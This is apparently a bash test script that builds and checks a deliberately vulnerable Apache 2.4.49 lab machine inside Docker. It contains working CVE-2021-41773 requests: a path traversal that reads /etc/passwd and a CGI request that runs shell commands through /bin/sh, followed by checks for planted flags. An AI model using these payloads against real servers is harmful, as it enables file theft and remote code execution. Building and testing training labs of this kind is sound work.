#!/bin/bash
# Machine 03: PathFinder — CVE-2021-41773 Test
# Tests: Apache 2.4.49 on 80, path traversal, CGI RCE surface
source "$(dirname "$0")/_lib.sh"

BASE_DIR=${1:-$(dirname "$(dirname "$0")")}
CLEANUP=${2:-true}
MACHINE_DIR="$BASE_DIR/03-pathfinder"
COMPOSE="$MACHINE_DIR/docker-compose.yml"
CONTAINER="lm-03-pathfinder"
IP="10.10.3.10"

trap '[ "$CLEANUP" = true ] && stop_machine "$COMPOSE"' EXIT

section "Build & Start"
start_machine "$COMPOSE" "$CONTAINER" 90 || finish

section "Network Checks"
check_port "$IP" 80 "Apache HTTP"
check_port "$IP" 22 "SSH"

section "Apache Version Fingerprint"
server_header=$(curl -sk -I "http://${IP}/" 2>/dev/null | grep -i "server:" | head -1)
echo "    Server header: $server_header"
echo "$server_header" | grep -qi "Apache" && pass "Apache is running" || fail "Apache not detected"
echo "$server_header" | grep -qi "2.4.49" && pass "Vulnerable Apache 2.4.49 confirmed" \
                                            || warn "Could not confirm 2.4.49 from header (may be hidden)"

section "Path Traversal (CVE-2021-41773)"
# The classic payload: /%2e%2e/%2e%2e/%2e%2e/etc/passwd
status=$(curl -sk -o /dev/null -w '%{http_code}' \
  "http://${IP}/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" 2>/dev/null)
body=$(curl -sk "http://${IP}/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" 2>/dev/null)

if echo "$body" | grep -q "root:"; then
  pass "Path traversal reads /etc/passwd (CVE-2021-41773 confirmed)"
elif [ "$status" = "200" ]; then
  warn "HTTP 200 but /etc/passwd not in response — check Apache config"
else
  fail "Path traversal returned HTTP $status"
fi

section "CGI RCE Surface"
# Try CGI command execution
cgi_out=$(curl -sk --max-time 5 \
  "http://${IP}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
  -d 'echo Content-Type: text/plain; echo; id' 2>/dev/null)
echo "$cgi_out" | grep -q "uid=" && pass "CGI RCE via path traversal works" \
                                  || warn "CGI RCE not confirmed (may need exact Apache commit)"

section "Flags"
check_exec "$CONTAINER" "cat /root/root.txt" "FLAG{" "Root flag"
check_exec "$CONTAINER" "cat /home/user/user.txt" "FLAG{" "User flag"

finish
